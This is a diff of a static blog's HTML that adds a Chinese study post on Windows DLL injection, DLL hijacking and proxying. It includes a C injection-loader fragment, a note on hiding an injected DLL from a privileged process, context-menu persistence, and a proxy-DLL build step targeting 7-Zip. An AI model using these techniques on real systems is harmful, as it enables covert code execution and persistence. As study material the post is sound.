+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">StartHook</span><span class="p">(</span><span class="n">proci</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">proci</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="n">DllName</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">TerminateProcess</span><span class="p">(</span><span class="n">proci</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Terminated Process</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">getchar</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">proci</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">proci</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">proci</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/posts/dll_injection_and_dll_hijacking/image-20220123010958223.png" alt="image-20220123010958223" /></p>
+<h3 id="依赖可信进程注入">依赖可信进程注入</h3>
+<p>首先将a.dll注入到诸如Services.exe等权限较高的进程中，然后利用a.dll将b.dll远程线程注入到待注入进程中</p>
+<p>利用完成后为影藏可以使用FreeLibraryAndExitThread()，其将dll自身卸载掉并且退出线程。</p>
+<p><img src="/images/posts/dll_injection_and_dll_hijacking/image-20220122015252720.png" alt="image-20220122015252720" /></p>
+<p>ComRes注入/输入法注入</p>
+<h2 id="reflective-dll-injection">Reflective DLL Injection</h2>
+<h2 id="dll-hijackingproxying">Dll hijacking&amp;proxying</h2>
+<p><code>dll代理</code>是特殊的<code>dll劫持</code>，其原理图如下，本质是个wrapper，将正常的执行重定向到真的dll，然后wrapper添加额外的功能，load的时候程序先load proxy，proxy再load real dll。</p>
+<p>DLL Proxying is achieved through a DLL Wrapper. The idea is very simple and quite self-explanatory at this point. A DLL Wrapper consists in redirecting all the functions to the original DLL using forwarders. In a typical DLL, the Export Table contains a list of addresses that point to the code of each exported function inside the PE file. But, there is a second option: it can also contain Forwarders. Instead of referencing some code inside the DLL itself, a Forwarder points to a string, which gives the name (or the ordinal number) of the exported function and the name of the DLL in which it can be found (e.g.: FOO.DummyFunction or FOO.#47). This feature is exactly what we need in order to transparently redirect all the functions to the orignal DLL as described on this diagram.</p>
+<p><img src="/images/posts/dll_injection_and_dll_hijacking/dp02_dll-proxy.png" alt="dp02_dll-proxy" /></p>
+<h3 id="context-menu-persistance">Context menu Persistance</h3>
+<p>因为Context menu自动运行的特征，通过explorer.exe加载的dll可以实现持久化</p>
+<p>使用Sysinternals中程序Autoruns可以看到ContextMenu加载的dll</p>
+<h4 id="创建一个proxy-dll">创建一个proxy dll</h4>
+<p><a href="https://github.com/rek7/dll-hijacking">https://github.com/rek7/dll-hijacking</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">python</span> <span class="n">parse</span><span class="p">.</span><span class="n">py</span> <span class="n">-d</span> <span class="n">7-zip</span><span class="p">.</span><span class="n">dll</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>生成头文件保存在definitions.h中，只要实现dllmain.cpp然后编译出dll即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">7-Zip</span><span class="p">&gt;</span> <span class="nb">ls
+</span><span class="nb"></span>
+
+    <span class="n">目录</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">7-Zip</span>
+
+
+<span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>
+<span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>
+<span class="n">d</span><span class="p">----</span>         <span class="n">2022</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">20</span>     <span class="n">21</span><span class="err">:</span><span class="n">10</span>            <span class="n">Lang</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">27</span>     <span class="n">18</span><span class="err">:</span><span class="n">00</span>     <span class="n">112890</span> <span class="n">7-zip</span><span class="p">.</span><span class="n">chm</span>
+<span class="n">-a</span><span class="p">---</span>         <span class="n">2022</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">20</span>     <span class="n">21</span><span class="err">:</span><span class="n">40</span>      <span class="n">58880</span> <span class="n">7-zip</span><span class="p">.</span><span class="n">dll</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>      <span class="n">62976</span> <span class="n">7-zip32</span><span class="p">.</span><span class="n">dll</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>      <span class="n">93696</span> <span class="n">7-zip_</span><span class="p">.</span><span class="n">dll</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>    <span class="n">1710080</span> <span class="n">7z</span><span class="p">.</span><span class="n">dll</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>     <span class="n">535040</span> <span class="n">7z</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>     <span class="n">215040</span> <span class="n">7z</span><span class="p">.</span><span class="n">sfx</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>     <span class="n">193536</span> <span class="n">7zCon</span><span class="p">.</span><span class="n">sfx</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>     <span class="n">945664</span> <span class="n">7zFM</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>     <span class="n">667136</span> <span class="n">7zG</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">-a</span><span class="p">---</span>         <span class="n">2018</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">28</span>     <span class="n">17</span><span class="err">:</span><span class="n">00</span>        <span class="n">366</span> <span class="n">descript</span><span class="p">.</span><span class="n">ion</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">27</span>     <span class="n">16</span><span class="err">:</span><span class="n">52</span>      <span class="n">54604</span> <span class="n">History</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">-a</span><span class="p">---</span>         <span class="n">2021</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">17</span>     <span class="n">23</span><span class="err">:</span><span class="n">12</span>       <span class="n">3990</span> <span class="n">License</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">21</span><span class="err">:</span><span class="n">54</span>       <span class="n">1702</span> <span class="n">readme</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">-a</span><span class="p">---</span>        <span class="n">2021</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">26</span>     <span class="n">22</span><span class="err">:</span><span class="n">00</span>      <span class="n">14848</span> <span class="n">Uninstall</span><span class="p">.</span><span class="n">exe</span>
+
+
+<span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">7-Zip</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>经测试编译出来在本机win10可以代理成功，换到win7不能，应该是win接口变了吧。</p>
+<h2 id="refer">refer</h2>
+<p><a href="https://uknowsec.cn/archives/">https://uknowsec.cn/archives/</a> <br />
+<a href="https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html">https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html</a> <br />
+<a href="https://blog.raphael.karger.is/articles/2020-03/context-menu-persistance">https://blog.raphael.karger.is/articles/2020-03/context-menu-persistance</a> [context-menu-persistance]<br />
+<a href="https://www.cnblogs.com/wf751620780/p/10730013.html#autoid-4-3-0">https://www.cnblogs.com/wf751620780/p/10730013.html#autoid-4-3-0</a> [dll hijacking]<br />
+<a href="https://github.com/rek7/dll-hijacking">https://github.com/rek7/dll-hijacking</a> [dll hijacking]<br />
+<a href="https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks">https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks</a> [dll hijacking]<br />
+<a href="https://itm4n.github.io/dll-proxying/">https://itm4n.github.io/dll-proxying/</a> [dll proxying]<br />
+<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a> [autoruns.exe]<br />
+<a href="https://blog.csdn.net/yuyan987/article/details/78558648">https://blog.csdn.net/yuyan987/article/details/78558648</a> [message box]<br />
+<a href="https://www.cnblogs.com/wf751620780/p/10730013.html">https://www.cnblogs.com/wf751620780/p/10730013.html</a> [dll injection]<br />
+<a href="https://blog.csdn.net/Cody_Ren/article/details/100053434">https://blog.csdn.net/Cody_Ren/article/details/100053434</a> [dll injection]<br />
+<a href="https://github.com/theevilbit/injection">https://github.com/theevilbit/injection</a> [injections demo]<br />
+<a href="https://422926799.github.io/posts/9a523925.html">https://422926799.github.io/posts/9a523925.html</a> [image hijack]<br />
+<a href="https://docs.microsoft.com/zh-cn/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022">https://docs.microsoft.com/zh-cn/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger?view=vs-2022</a> [sys symbol]<br />
+<a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot</a> [CreateToolhelp32Snapshot]<br />
+<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex</a> [CreateRemoteThreadEx api]<br />
+<a href="https://blog.csdn.net/Cody_Ren/article/details/100041660">https://blog.csdn.net/Cody_Ren/article/details/100041660</a> [CreateRemoteThreadEx]<br />
+<a href="https://blog.csdn.net/weixin_43956962/article/details/105843803">https://blog.csdn.net/weixin_43956962/article/details/105843803</a> [ReflectiveDLLInjection]<br />
+<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> [ReflectiveDLLInjection]<br />
+<a href="https://bbs.pediy.com/thread-260235.htm#msg_header_h1_0">https://bbs.pediy.com/thread-260235.htm#msg_header_h1_0</a> [RDI analyze]<br />
+<a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-address-table">https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-address-table</a> [PE format]<br />
+<a href="https://www.apriorit.com/dev-blog/536-detecting-hook-and-rop-attacks">https://www.apriorit.com/dev-blog/536-detecting-hook-and-rop-attacks</a> [detect hook&amp;ROP Attacks]</p>
 
     </article>
     
@@ -2285,21 +3160,14 @@
 <nav class="pagination-single">
   
     
-      <a href="https://ruokeqx.gitee.io/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/" class="pagination-single__left">
+      <a href="https://ruokeqx.gitee.io/posts/csrfad/" class="pagination-single__left">
         <div class="pagination-single__icon">
           <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
         </div>
-        <div class="pagination-single__left-title">操作系统课程设计</div>      
+        <div class="pagination-single__left-title">CSRF攻击防御/Hackbar攻击原理及Flask防御策略研究</div>      
       </a>
     
     <div class="grow"></div>
-    
-      <a href="https://ruokeqx.gitee.io/posts/dll_injection_and_dll_hijacking/" class="pagination-single__right">      
-        <div class="pagination-single__right-title">DLL注入及DLL劫持简单学习</div>
-        <div class="pagination-single__icon">
-          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
-        </div>
-      </a>
     
   
 </nav>
@@ -2655,36 +3523,29 @@ document.addEventListener('DOMContentLoaded', function () {
   <div class="toc " data-dir="ltr" data-folding="true" data-ani="true">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#前言">前言</a></li>
-    <li><a href="#csrf攻击">CSRF攻击</a>
+    <li><a href="#static-library-and-dynamic-library">static library and dynamic library</a></li>
+    <li><a href="#dll-injection">Dll injection</a>
       <ul>
-        <li><a href="#get型攻击">GET型攻击</a></li>
-        <li><a href="#post型攻击">POST型攻击</a></li>
+        <li><a href="#注册表">注册表</a></li>
+        <li><a href="#image-hijack">Image hijack</a></li>
+        <li><a href="#apc-injection">APC injection</a></li>
+        <li><a href="#createremotethreadex">CreateRemoteThread[Ex]</a></li>
+        <li><a href="#setwindowshookex">SetWindowsHook[Ex]</a></li>
+        <li><a href="#createprocessopenthread-context-patching">CreateProcess/OpenThread context patching</a></li>
+        <li><a href="#依赖可信进程注入">依赖可信进程注入</a></li>
       </ul>
     </li>
-    <li><a href="#csrf检测">CSRF检测</a>
+    <li><a href="#reflective-dll-injection">Reflective DLL Injection</a></li>
+    <li><a href="#dll-hijackingproxying">Dll hijacking&amp;proxying</a>
       <ul>
-        <li><a href="#csrftester">CSRFTester</a></li>
-      </ul>
-    </li>
-    <li><a href="#csrf防御">CSRF防御</a>
-      <ul>
-        <li><a href="#referer">referer</a>
+        <li><a href="#context-menu-persistance">Context menu Persistance</a>
           <ul>
-            <li><a href="#hackbar源码阅读">Hackbar源码阅读</a></li>
+            <li><a href="#创建一个proxy-dll">创建一个proxy dll</a></li>
           </ul>
         </li>
-        <li><a href="#csrf-token">csrf token</a></li>
-        <li><a href="#添加http-request头">添加http request头</a></li>
-        <li><a href="#添加验证机制">添加验证机制</a></li>
       </ul>
     </li>
-    <li><a href="#flask-csrf-strategy">Flask CSRF Strategy</a>
-      <ul>
-        <li><a href="#源码分析">源码分析</a></li>
-      </ul>
-    </li>
-    <li><a href="#参考文献">参考文献</a></li>
+    <li><a href="#refer">refer</a></li>
   </ul>
 </nav>
   </div>
